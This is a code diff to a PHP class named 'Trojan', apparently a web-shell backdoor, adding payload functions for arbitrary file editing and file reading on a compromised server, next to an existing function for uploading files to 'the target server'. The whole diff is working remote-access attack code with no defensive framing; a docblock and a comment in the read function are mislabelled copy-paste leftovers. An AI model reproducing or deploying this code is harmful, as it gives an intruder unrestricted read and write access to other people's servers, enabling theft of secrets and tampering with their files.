@@ -173,6 +173,83 @@ class Trojan{
     }
 
     /**
+     * Edits a file on the server
+     */
+    public function payload_file_edit($args){
+        # cd to the appropriate directory
+        chdir($this->cwd);
+
+        # verify file exists
+        if(!file_exists($args['file'])){
+            $this->response = array(
+                'error'          => 'The specified file does not exist.',
+                'prompt_context' => $this->prompt_context,
+            );
+            $this->send_response();
+        }
+
+        # verify file is writeable
+        if(!is_writeable($args['file'])){
+            $this->response = array(
+                'error'          => 'The specified file is not writeable.',
+                'prompt_context' => $this->prompt_context,
+            );
+            $this->send_response();
+        }
+
+        # if good, write the file
+        $success = file_put_contents($args['file'], $args['data']);
+
+        # notify the user of the result
+        if($success === false){
+            $this->response = array(
+                'error'          => 'Failed to write file.',
+                'prompt_context' => $this->prompt_context,
+            );
+        }
+        else {
+            $this->response = array(
+                'output'         => 'File written successfully.',
+                'prompt_context' => $this->prompt_context,
+            );
+        }
+        $this->send_response();
+    }
+
+    /**
+     * Edits a file on the server
+     */
+    public function payload_file_read($args){
+        # cd to the appropriate directory
+        chdir($this->cwd);
+
+        # verify file exists
+        if(!file_exists($args['file'])){
+            $this->response = array(
+                'error'          => 'The specified file does not exist.',
+                'prompt_context' => $this->prompt_context,
+            );
+            $this->send_response();
+        }
+
+        # verify file is writeable
+        if(!is_readable($args['file'])){
+            $this->response = array(
+                'error'          => 'The specified file is not readable.',
+                'prompt_context' => $this->prompt_context,
+            );
+            $this->send_response();
+        }
+
+        # echo back the contents of the file
+        $this->response = array(
+            'output'         => file_get_contents($args['file']),
+            'prompt_context' => $this->prompt_context,
+        );
+        $this->send_response();
+    }
+
+    /**
      * Uploads files to the target server
      */
     public function payload_file_up($args){
